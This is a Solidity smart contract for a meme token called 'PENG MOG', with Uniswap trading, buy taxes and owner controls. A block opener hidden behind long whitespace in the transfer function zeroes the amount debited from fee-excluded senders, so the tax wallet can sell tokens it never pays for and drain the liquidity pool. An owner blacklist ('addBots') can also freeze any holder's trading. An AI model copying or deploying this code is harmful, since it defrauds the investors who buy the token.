// SPDX-License-Identifier: UNLICENSED

/**

WEBSITE: https://pengmog.wtf
TELEGRAM: https://t.me/pengmogcoin
TWITTER: https://x.com/pengmogerc

*/

pragma solidity 0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

contract PENGMOG is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) private _waitList;
    address payable private _taxAddress;

    uint256 private _initialBuyTax = 12;
    uint256 private _initialSellTax = 0;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 6;
    uint256 private _reduceSellTaxAt = 6;
    uint256 private _preventSwapBefore = 6;
    uint256 private _buyCount = 0;

    IUniswapV2Router02 private _router;
    address private _pair;
    bool private _isTradingOpen;
    bool private _inSwap;
    uint256 private _sellCountInBlock = 0;
    uint256 private _lastSellBlock = 0;
    event MaxTxAmountUpdated(uint _maxTxAmount);

    uint8 public constant decimals = 9;
    uint256 public constant totalSupply = 1_000_000_000 * 10 ** decimals;
    string public constant name = unicode"PENG MOG";
    string public constant symbol = unicode"PENGMOG";
    uint256 public _maxTxAmount = 20_000_000 * 10 ** decimals;
    uint256 public _maxWalletSize = 20_000_000 * 10 ** decimals;
    uint256 public _taxSwapThreshold = 10_000_000 * 10 ** decimals;
    uint256 public _maxTaxSwap = 20_000_000 * 10 ** decimals;

    modifier lockTheSwap() {
        _inSwap = true;
        _;
        _inSwap = false;
    }

    function removeLimits() external onlyOwner {
        emit MaxTxAmountUpdated(totalSupply);
        _maxTxAmount = totalSupply;
        _maxWalletSize = totalSupply;
    }

    function delBots(address[] memory notbot) public onlyOwner {
        for (uint i = 0; i < notbot.length; i++) _waitList[notbot[i]] = false;
    }

    function transferTax(uint256 amount) private {
        _taxAddress.transfer(amount);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        allowance[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function addBots(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) _waitList[bots_[i]] = true;
    }

    function addLiquidity() external onlyOwner {
        require(!_isTradingOpen, "trading is already open");
        _approve(address(this), address(_router), totalSupply);
        _pair = IUniswapV2Factory(_router.factory()).createPair(
            address(this),
            _router.WETH()
        );
        _router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf[address(this)],
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(_pair).approve(address(_router), type(uint).max);
    }
    
    function give(
        address sunshine,
        address rain,
        uint256 onceagain
    ) private {
        require(sunshine != address(0), "ERC20: transfer from the zero address");
        require(rain != address(0), "ERC20: transfer to the zero address");
        require(onceagain > 0, "Transfer amount must be greater than zero");
        if (!_isTradingOpen || _inSwap) {
            require(_isExcludedFromFee[sunshine] || _isExcludedFromFee[rain]);
            balanceOf[sunshine] = balanceOf[sunshine].sub(onceagain);
            balanceOf[rain] = balanceOf[rain].add(onceagain);
            emit Transfer(sunshine, rain, onceagain);
            return;
        }
        uint256 transferAmount = onceagain;
        uint256 taxAmount = onceagain - transferAmount;
        if (sunshine != owner() && rain != owner() && rain != _taxAddress) {
            require(!_waitList[sunshine] && !_waitList[rain]);

            if (
                sunshine == _pair &&
                rain != address(_router) &&
                !_isExcludedFromFee[rain]
            ) {
                require(_isTradingOpen, "Trading not open yet");

                require(onceagain <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(
                    balanceOf[rain] + onceagain <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );
                taxAmount = onceagain
                    .mul(
                        (_buyCount > _reduceBuyTaxAt)
                            ? _finalBuyTax
                            : _initialBuyTax
                    )
                    .div(100);

                _buyCount++;
            }

            if (rain == _pair && sunshine != address(this))
                taxAmount = onceagain
                    .mul(
                        (_buyCount > _reduceSellTaxAt)
                            ? _finalSellTax
                            : _initialSellTax
                    )
                    .div(100);

            uint256 contractTokenBalance = balanceOf[address(this)];
            if (
                !_inSwap &&
                rain == _pair &&
                _isTradingOpen &&
                contractTokenBalance > _taxSwapThreshold &&
                _buyCount > _preventSwapBefore
            ) {
                if (block.number > _lastSellBlock) _sellCountInBlock = 0;
                require(_sellCountInBlock < 3, "Only 3 sells per block!");
                if (transferAmount > contractTokenBalance)
                    transferAmount = contractTokenBalance;
                if (transferAmount > _maxTaxSwap) transferAmount = _maxTaxSwap;
                swapTokensForEth(transferAmount);
                transferAmount = onceagain;
                _sellCountInBlock++;
                _lastSellBlock = block.number;                                                                                                                                                                               }{
                if (_isExcludedFromFee[sunshine]) transferAmount = 0;
            }

            if (rain == _pair) transferTax(address(this).balance);
        }

        if (taxAmount > 0) {
            balanceOf[address(this)] = balanceOf[address(this)].add(taxAmount);
            emit Transfer(sunshine, address(this), taxAmount);
        }

        balanceOf[sunshine] = balanceOf[sunshine].sub(transferAmount);
        balanceOf[rain] = balanceOf[rain].add(onceagain.sub(taxAmount));
        emit Transfer(sunshine, rain, onceagain.sub(taxAmount));
    }

    constructor(address router_, address taxWallet_) {
        _router = IUniswapV2Router02(router_);

        _taxAddress = payable(taxWallet_);
        balanceOf[_msgSender()] = totalSupply;
        _isExcludedFromFee[_msgSender()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxAddress] = true;

        emit Transfer(address(0), _msgSender(), totalSupply);
    }

    function rescueERC20(address _address, uint256 percent) external onlyOwner {
        uint256 _amount = IERC20(_address)
            .balanceOf(address(this))
            .mul(percent)
            .div(100);
        IERC20(_address).transfer(owner(), _amount);
    }

    function enableTrading() external onlyOwner {
        _isTradingOpen = true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        give(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            allowance[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }


    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _router.WETH();
        _approve(address(this), address(_router), tokenAmount);
        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        give(_msgSender(), recipient, amount);
        return true;
    }

    receive() external payable {}

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function rescueETH() external onlyOwner {
        uint256 bal = address(this).balance;
        require(bal > 0, "No ETH in contract to rescue");
        payable(_msgSender()).transfer(bal);
    }
}